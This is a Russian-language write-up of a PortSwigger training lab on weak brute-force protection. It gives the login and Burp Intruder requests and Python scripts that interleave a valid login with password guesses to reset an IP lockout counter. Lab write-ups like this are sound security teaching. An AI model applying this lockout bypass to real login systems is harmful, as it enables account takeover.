---
title: "Broken brute-force protection, IP block"
date: 2025-10-02
tags: [web, authentication, writeup]  
categories: [PortSwigger]
tagline: ""
header:
  overlay_image: /assets/images/IMG_writeups/IMG_PortSwigger/ps_logo.webp
  overlay_filter: 0.5 
  overlay_color: "#fff"
  actions:
    - label: "Lab PortSwigger"
      url: "https://portswigger.net/web-security/learning-paths/authentication-vulnerabilities/password-based-vulnerabilities/authentication/password-based/lab-broken-bruteforce-protection-ip-block"
classes: wide
---

Для решения лабы нужно подобрать пароль учетки `carlos`. Для входа даны креды от другой учетной записи `wiener`:`peter`.

```
https://0acf002004444315819e8bac00de00b3.web-security-academy.net/
```

## Solution

Для начала зайду в ЛК, чтобы собрать `HTTP`-запрос для логина.

```http
POST /login HTTP/2
Host: 0acf002004444315819e8bac00de00b3.web-security-academy.net
Cookie: session=ogPofwrZEKbNt7g7PxHC52TnAaOEEabb
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:137.0) Gecko/20100101 Firefox/137.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0acf002004444315819e8bac00de00b3.web-security-academy.net/login
Content-Type: application/x-www-form-urlencoded
Content-Length: 30
Origin: https://0acf002004444315819e8bac00de00b3.web-security-academy.net
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers

username=wiener&password=peter
```

Попробую перебрать пароли из [списка](https://portswigger.net/web-security/authentication/auth-lab-passwords). На этот раз сразу буду делать через `Burp Intruder`. 

```http
POST /login HTTP/2
Host: 0acf002004444315819e8bac00de00b3.web-security-academy.net

username=carlos&password=§passwd§
```

Начав атаку, я словил блокировку. Она появилась после четырех неверных попыток. Попробую чередовать перебор пароля и корректные данные каждую третью попытку.

![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_authentication/IMG_Broken_brute-force_protection_IP_block/1.png){: height="200" .align-center}

Для этого нужно сгенерить следующий список логинов:

```
wiener
carlos
carlos
...
```

А каждый четвертый пароль должен быть `peter`. Напишу программу на `python`:

```python
for _ in range(50):
	print('wiener\ncarlos\ncarlos')
```

```
wiener
carlos
carlos
wiener
carlos
carlos
wiener
carlos
carlos
wiener
carlos
carlos
wiener
carlos
carlos
wiener
...
```

Сохраню пароли в файл `passwds`. Далее сгенерю новый список:

```python
with open('passwds', 'r') as f:
    lines = f.readlines()
    for i, line in enumerate(lines):
        if (i % 2 == 0):
            print('peter')
        print(line, end='')

```

Получился следующий список:

```
peter
123456
password
peter
12345678
qwerty
peter
123456789
12345
peter
1234
111111
peter
1234567
dragon
peter
123123
baseball
peter
abc123
football
peter
...
```

Теперь составлю атаку в `Intruder` типа `Pitchfork`. Пейлоад:

```http
POST /login HTTP/2
Host: 0acf002004444315819e8bac00de00b3.web-security-academy.net

username=§login§&password=§passwd§
```

В качестве 1-го списка вставлю логины. В качестве 2-го - пароли. Также нужно выставить один рабочий поток в `Resource Pool`:

![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_authentication/IMG_Broken_brute-force_protection_IP_block/2.png){: height="200" .align-center}

Далее запущу атаку. Чтобы получить правильный пароль, отфильтрую ответы по строке `carlos` и `Status code`, равному `3xx`.

![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_authentication/IMG_Broken_brute-force_protection_IP_block/3.png){: height="200" .align-center}

Зайду в ЛК:

![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_authentication/IMG_Broken_brute-force_protection_IP_block/4.png){: height="200" .align-center}